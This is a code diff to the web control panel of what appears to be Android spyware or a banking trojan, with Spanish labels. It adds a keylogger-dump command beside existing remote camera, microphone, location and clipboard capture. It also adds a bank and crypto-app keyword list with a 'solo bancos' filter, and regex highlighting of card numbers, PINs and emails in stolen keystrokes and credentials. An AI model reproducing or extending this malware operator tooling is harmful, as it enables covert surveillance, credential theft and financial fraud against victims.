@@ -49,6 +49,14 @@
   #modbar{display:flex;gap:8px;align-items:center;padding:8px;background:var(--bg2);border:1px solid var(--line);border-radius:8px;margin-bottom:8px;flex-wrap:wrap;max-width:96vw}
   #modalimg{max-width:94vw;max-height:78vh;border:1px solid var(--line);cursor:crosshair;background:#000}
   .grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  tr.bank{background:#231d08;border-left:3px solid var(--warn)}
+  tr.bank td:first-child{border-left:3px solid var(--warn)}
+  .pin{color:#ffd24a;font-weight:700;background:#2e2609;padding:0 3px;border-radius:3px}
+  .tarjeta{color:#5ce68a;font-weight:700;background:#0d2a18;padding:0 3px;border-radius:3px}
+  .mail{color:#79b8ff;font-weight:600}
+  .app{color:#e0a3ff}
+  .chk{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--dim);margin-bottom:8px}
+  .chk input{width:auto;margin:0}
   @media(max-width:820px){#side{width:100%} #wrap{flex-direction:column} .grid2{grid-template-columns:1fr}}
 </style>
 </head>
@@ -108,6 +116,7 @@
           <button onclick="cmd('loc')">Ubicacion</button>
           <button onclick="cmd('wifi')">Redes WiFi</button>
           <button onclick="cmd('clip')">Portapapeles</button>
+          <button onclick="cmd('keylog_dump')">Volcar teclas</button>
           <button onclick="cmd('photo',{cam:'back'})">Foto trasera</button>
           <button onclick="cmd('photo',{cam:'front'})">Foto frontal</button>
           <button onclick="cmd('mic',{secs:15})">Grabar micro 15s</button>
@@ -159,11 +168,11 @@
 
       <div class="card">
         <h3>Actividad</h3>
-        <div class="row" style="margin-bottom:8px">
+        <div class="row" style="margin-bottom:8px;align-items:center">
           <select id="evtype" onchange="loadEvents()" style="width:auto;margin:0">
             <option value="">todo</option>
-            <option value="app_fg">apps abiertas</option>
             <option value="key">teclas</option>
+            <option value="app_fg">apps abiertas</option>
             <option value="sms">sms</option>
             <option value="loc">ubicacion</option>
             <option value="notif">notificaciones</option>
@@ -171,9 +180,10 @@
             <option value="net">red</option>
             <option value="log">log</option>
           </select>
+          <label class="chk"><input type="checkbox" id="soloBanco" onchange="loadEvents()">solo bancos</label>
         </div>
         <div class="scroll"><table id="events"><thead><tr>
-          <th style="width:110px">hora</th><th style="width:90px">tipo</th><th>datos</th>
+          <th style="width:110px">hora</th><th style="width:80px">tipo</th><th>datos</th>
         </tr></thead><tbody></tbody></table></div>
       </div>
 
@@ -206,6 +216,22 @@
 const BASE = location.pathname.replace(/\/+$/, '');
 let DEV = null, DEVICES = [], timer = null, timer2 = null, liveTimer = null;
 const $ = id => document.getElementById(id);
+
+const BANCOS = ['banco','nequi','daviplata','bancolombia','bdv','venezuela','mercantil','provincial',
+  'bbva','santander','bancaribe','bnc','tesoro','exterior','bicentenario','paypal','zelle','binance',
+  'binance','coinbase','banesco','fondo','credito','ahorro','bdvenlinea'];
+
+function esBanco(t) {
+  t = String(t || '').toLowerCase();
+  return BANCOS.some(b => t.indexOf(b) >= 0);
+}
+
+function resalta(s) {
+  return esc(s)
+    .replace(/\b(\d{13,19})\b/g, '<span class="tarjeta">$1</span>')
+    .replace(/\b(\d{4,8})\b/g, '<span class="pin">$1</span>')
+    .replace(/\b([\w.+-]+@[\w.-]+\.\w+)\b/g, '<span class="mail">$1</span>');
+}
 
 async function api(p, opt) {
   const r = await fetch(BASE + p, Object.assign({
@@ -310,10 +336,8 @@ function zoom(u, w, h) {
 
 function openLive() {
   $('modal').style.display = 'flex';
-  if (!$('modalimg').src || $('modalimg').src.endsWith('/')) { }
   startLive();
 }
-
 function startLive() {
   stopLive();
   $('livebtn').textContent = 'EN VIVO: on';
@@ -323,14 +347,12 @@ function startLive() {
     await loadShots();
   }, 2500);
 }
-
 function stopLive() {
   clearInterval(liveTimer);
   liveTimer = null;
   $('livebtn').textContent = 'EN VIVO: off';
   $('livebtn').className = 'g';
 }
-
 function toggleLive() { liveTimer ? stopLive() : startLive(); }
 function closeModal() { $('modal').style.display = 'none'; stopLive(); }
 function manualShot() { cmd('screenshot'); setTimeout(loadShots, 1500); }
@@ -353,18 +375,37 @@ function sendTextFromModal() {
 
 async function loadEvents() {
   const t = $('evtype').value;
-  const d = await api('/api/events?device=' + encodeURIComponent(DEV) + '&limit=250&type=' + encodeURIComponent(t));
-  $('events').tBodies[0].innerHTML = d.events.map(e =>
-    `<tr><td class="mono">${new Date(e.ts).toLocaleTimeString()}</td><td>${esc(e.type)}</td>
-     <td class="mono">${esc(JSON.stringify(e.data))}</td></tr>`).join('');
+  const solo = $('soloBanco').checked;
+  const d = await api('/api/events?device=' + encodeURIComponent(DEV) + '&limit=400&type=' + encodeURIComponent(t));
+  let lista = d.events;
+  if (solo) lista = lista.filter(e => esBanco(JSON.stringify(e.data)));
+
+  $('events').tBodies[0].innerHTML = lista.map(e => {
+    const raw = JSON.stringify(e.data);
+    const pkg = (e.data && e.data.pkg) ? e.data.pkg : '';
+    const banco = esBanco(pkg) || esBanco(raw);
+    const txt = (e.data && e.data.text) ? e.data.text : raw;
+    const col = (e.data && e.data.text)
+      ? resalta(txt)
+      : resalta(raw).replace(esc(pkg), '<span class="app">' + esc(pkg) + '</span>');
+    return `<tr class="${banco ? 'bank' : ''}">
+      <td class="mono">${new Date(e.ts).toLocaleTimeString()}</td>
+      <td>${banco ? '&#127974; ' : ''}${esc(e.type)}</td>
+      <td class="mono">${col}</td></tr>`;
+  }).join('');
 }
 
 async function loadCreds() {
   const d = await api('/api/creds?device=' + encodeURIComponent(DEV));
-  $('creds').tBodies[0].innerHTML = d.creds.map(c =>
-    `<tr><td class="mono">${new Date(c.ts).toLocaleTimeString()}</td><td>${esc(c.pkg)}</td>
-     <td>${esc(c.kind)}</td><td class="mono">${esc(c.username)}</td>
-     <td class="mono b">${esc(c.secret)}</td></tr>`).join('');
+  $('creds').tBodies[0].innerHTML = d.creds.map(c => {
+    const banco = esBanco(c.pkg);
+    return `<tr class="${banco ? 'bank' : ''}">
+      <td class="mono">${new Date(c.ts).toLocaleTimeString()}</td>
+      <td>${banco ? '&#127974; ' : ''}${esc(c.pkg)}</td>
+      <td>${esc(c.kind)}</td>
+      <td class="mail">${esc(c.username)}</td>
+      <td class="pin">${esc(c.secret)}</td></tr>`;
+  }).join('');
 }
 
 async function loadCommands() {
